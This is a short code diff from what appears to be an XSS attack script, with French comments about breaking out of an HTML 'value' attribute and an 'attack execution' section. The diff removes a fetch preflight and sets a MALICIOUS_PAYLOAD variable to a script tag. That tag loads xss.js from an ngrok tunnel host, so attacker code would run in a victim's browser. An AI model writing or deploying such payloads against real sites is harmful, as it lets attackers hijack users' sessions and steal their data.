@@ -81,19 +81,7 @@
         // --- FIX DE LA CHAÎNE XSS ---
         // Ajout des échappements nécessaires (">< et <!--) pour sortir de l'attribut 'value' HTML.
         const url = "https://9bb8bf9a5d86.ngrok-free.app/xss.js";
-
-        fetch(url, {
-            method: 'GET',
-            headers: {
-                'ngrok-skip-browser-warning': 'true',
-            },
-        }).then(response => {
-            // After preflight, navigate to the URL
-            MALICIOUS_PAYLOAD = `<script src="${url}"></script>`;
-            console.log("Malicious payload prepared:", MALICIOUS_PAYLOAD);
-        }).catch(error => {
-            console.error('Error during fetch:', error);
-        });
+        MALICIOUS_PAYLOAD = `<script src="${url}"></script>`;
 
         // --- Exécution de l'attaque ---
 
